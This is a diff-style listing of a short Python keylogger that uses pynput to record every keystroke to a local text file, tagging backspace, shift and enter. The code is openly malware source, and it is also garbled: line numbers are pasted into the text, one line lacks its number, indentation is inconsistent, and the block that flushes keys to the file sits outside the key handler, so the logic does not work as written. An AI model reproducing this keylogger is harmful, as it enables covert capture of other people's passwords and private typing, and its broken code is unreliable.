@@ -1,0 +1,34 @@
+ #!/bin/env python3
+ 2
+ 3 from pynput.keyboard import Listener
+ 4 path = 'keyboard_Input.txt'
+ 5 keyboard_Input = []
+ 6 count = 0 
+ 7
+ 8 def on_press(key): 
+ 9     global keyboard_Input, count 
+10     keyboard_Input.append(key) 
+11     count += 1
+12     
+13 if count > 0: 
+14       count = 0 
+15       write_to_file(keyboard_Input) 
+16       keyboard_Input = []
+17
+18 def write_to_file(keys): 
+19  with open(path, 'a') as file:
+20      for key in keyboard_Input: 
+21          write_down = str(key).replace("'", "")
+22          if write_down.find('backspace') > 0: 
+23              file.write(' *BACKSPACE* ')
+24          elif write_down.find('shift') > 0: 
+25           file.write(' *SHIFT* ')
+26          elif write_down.find('enter') > 0: 
+27              file.write('\n')
+elif write_down.find('space') > 0: 
+29              file.write(' ')
+30          elif write_down.find('key'): 
+31              file.write(write_down)
+32
+33 with Listener(on_press=on_press) as listener: 
+34     listener.join()
